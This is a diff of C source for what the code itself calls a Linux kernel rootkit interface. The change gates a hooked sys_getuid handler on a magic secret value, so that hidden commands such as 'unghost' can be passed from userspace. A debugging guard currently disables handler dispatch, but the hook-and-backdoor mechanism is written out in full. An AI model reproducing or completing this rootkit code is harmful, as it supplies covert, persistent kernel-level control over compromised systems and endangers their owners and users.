@@ -40,17 +40,17 @@ static struct iface_command iface__commands[7] = {
     .handler = (iface_command_handler_t) &unghost
   }
 };
-
 static struct sctm_hook iface__hook = {
   .call = 102, /* `sys_getuid` */
   /* `.hook` is defined later on */
   /* `.hooked` is zeroed by the compiler */
   .unhook_method = SCTM_UNHOOK_METHOD_REPLACE
 };
+static unsigned long iface__secret = 0xDEADBEF0; /* ~0xDEADBEEF */
 
-unsigned long iface_hook_func(unsigned long numeric_secret,
-    char __user *command, unsigned long arg0, unsigned long arg1,
-    unsigned long arg2, unsigned long arg3) {
+unsigned long iface_hook_func(unsigned long secret, char __user *command,
+    unsigned long arg0, unsigned long arg1, unsigned long arg2,
+    unsigned long arg3) {
   char command_buf[100]; /* easier than `kmalloc`ing */
   iface_command_handler_t handler;
   unsigned int i;
@@ -60,34 +60,37 @@ unsigned long iface_hook_func(unsigned long numeric_secret,
   if (!iface__hook.hooked)
     return -EINVAL;
 
-  /*
-  get the command
+  if (secret == iface__secret) {
+    /*
+    get the command
 
-  we don't care if this fails, because `strcmp`
-  will take care of invalid buffers
-  */
+    we don't care if this fails, because `strcmp`
+    will take care of invalid buffers
+    */
 
-  memset(command_buf, '\0', sizeof(command_buf));
-  strncpy_from_user(command_buf, command, sizeof(command_buf));
+    memset(command_buf, '\0', sizeof(command_buf));
+    strncpy_from_user(command_buf, command, sizeof(command_buf));
 
-  /* grab the command handler */
+    /* grab the command handler */
 
-  handler = NULL;
+    handler = NULL;
 
-  for (i = 0; i < sizeof(iface__commands) / sizeof(iface__commands[0]); i++) {
-    if (!strcmp(command_buf, iface__commands[i].command)) {
-      handler = iface__commands[i].handler;
-      break;
+    for (i = 0; i < sizeof(iface__commands) / sizeof(iface__commands[0]); i++) {
+      if (!strcmp(command_buf, iface__commands[i].command)) {
+        printk("[rootkit interface] got command \"%s\".", command_buf);/////////////////////////////
+        handler = iface__commands[i].handler;
+        break;
+      }
     }
+
+    if (0///////////////////////////////////////////////////
+        && handler != NULL)
+      /* the command exists, and has a handler */
+
+      return (*handler)(arg0, arg1, arg2, arg3);
   }
-
-  if (0///////////////////////////////////////////
-      && handler != NULL)
-    /* the command exists, and has a handler */
-
-    return (*handler)(arg0, arg1, arg2, arg3);
-  return (*iface__hook.original)(numeric_secret, (unsigned long) command,
-    arg0, arg1, arg2, arg3);
+  return (*iface__hook.original)(secret, (unsigned long) command, arg0, arg1,
+    arg2, arg3);
 }
 
 int iface_init(void) { 
